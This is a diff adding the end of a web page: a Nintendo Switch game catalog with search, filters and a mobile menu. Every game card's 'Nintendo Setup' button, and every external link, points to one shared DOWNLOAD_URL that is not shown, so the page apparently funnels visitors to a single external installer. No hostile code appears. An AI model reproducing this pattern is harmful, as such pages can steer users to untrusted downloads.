+  img:"https://upload.wikimedia.org/wikipedia/en/f/fa/Pok%C3%A9mon_Sword_and_Shield.jpg"
+},
+
+{
+  name:"Minecraft",
+  genre:"Sandbox",
+  platform:"Switch",
+  series:"Minecraft",
+  icon:"⛏️",
+  desc:"Build, craft and explore endlessly creative worlds.",
+  img:"https://levelupgames.shop/cdn/shop/files/minecraft-switch.png?v=1782184141&width=1946"
+},
+
+{
+  name:"Hogwarts Legacy",
+  genre:"Action RPG",
+  platform:"Switch / Switch 2",
+  series:"Hogwarts",
+  icon:"🪄",
+  desc:"Explore the wizarding world in an open-world RPG.",
+  img:"https://upload.wikimedia.org/wikipedia/en/f/fb/Hogwarts_legacyboxart.png"
+}
+
+];
+
+/*
+============================================
+HTML ESCAPE
+============================================
+*/
+
+const esc = s => String(s).replace(
+  /[&<>"']/g,
+  c => ({
+    "&":"&amp;",
+    "<":"&lt;",
+    ">":"&gt;",
+    '"':"&quot;",
+    "'":"&#39;"
+  }[c])
+);
+
+/*
+============================================
+SEARCH AND CATEGORY FILTER
+============================================
+*/
+
+let active = "all";
+
+function render(){
+
+  const q = document
+    .getElementById("search")
+    .value.trim()
+    .toLowerCase();
+
+  const shown = games.filter(g => {
+
+    const matchFilter =
+      active === "all" ||
+      g.platform.includes(active) ||
+      g.series === active;
+
+    const searchable = [
+      g.name,
+      g.genre,
+      g.platform,
+      g.series,
+      g.desc
+    ].join(" ").toLowerCase();
+
+    return matchFilter && searchable.includes(q);
+
+  });
+
+  document.getElementById("counter").textContent =
+    shown.length + " Games";
+
+  document.getElementById("empty").style.display =
+    shown.length ? "none" : "block";
+
+  document.getElementById("gameGrid").innerHTML =
+    shown.map(g => `
+
+      <article class="card">
+
+        <div class="cover">
+
+          <div class="cover-fallback" aria-hidden="true">
+            ${g.icon}
+          </div>
+
+          <img
+            loading="lazy"
+            src="${esc(g.img)}"
+            alt="${esc(g.name)} game artwork"
+            onerror="this.style.display='none'"
+          >
+
+          <span class="platform-tag ${g.platform === 'Switch 2' ? 'next' : ''}">
+            ${esc(g.platform)}
+          </span>
+
+        </div>
+
+        <div class="card-body">
+
+          <div class="genre">
+            ${esc(g.genre)}
+          </div>
+
+          <h3>${esc(g.name)}</h3>
+
+          <p>${esc(g.desc)}</p>
+
+          <a
+            class="card-button"
+            href="${esc(DOWNLOAD_URL)}"
+            target="_blank"
+            rel="noopener noreferrer"
+            aria-label="Open Nintendo Setup external page"
+          >
+            ⬇ Nintendo Setup ↗
+          </a>
+
+          <div class="card-note">
+            External setup page • Not a game-specific download
+          </div>
+
+        </div>
+
+      </article>
+
+    `).join("");
+
+}
+
+/*
+============================================
+SET MAIN DOWNLOAD LINK
+============================================
+*/
+
+document.querySelectorAll("a.external").forEach(a => {
+  a.href = DOWNLOAD_URL;
+});
+
+/*
+============================================
+LIVE SEARCH
+============================================
+*/
+
+document.getElementById("search")
+.addEventListener("input", render);
+
+/*
+============================================
+FILTER BUTTONS
+============================================
+*/
+
+document.querySelectorAll(".filter").forEach(b => {
+
+  b.addEventListener("click", () => {
+
+    active = b.dataset.filter;
+
+    document.querySelectorAll(".filter").forEach(x => {
+      x.classList.toggle("active", x === b);
+    });
+
+    render();
+
+  });
+
+});
+
+/*
+============================================
+MOBILE MENU
+============================================
+*/
+
+document.getElementById("menu")
+.addEventListener("click", function(){
+
+  let opened = document
+    .getElementById("nav")
+    .classList.toggle("open");
+
+  this.setAttribute("aria-expanded", opened);
+
+});
+
+document.querySelectorAll("#nav a").forEach(a => {
+
+  a.addEventListener("click", () => {
+
+    document.getElementById("nav")
+      .classList.remove("open");
+
+    document.getElementById("menu")
+      .setAttribute("aria-expanded","false");
+
+  });
+
+});
+
+/*
+============================================
+INITIALIZE
+============================================
+*/
+
+document.getElementById("year").textContent =
+  new Date().getFullYear();
+
+render();
+
+</script>
+
+</body>
+</html>
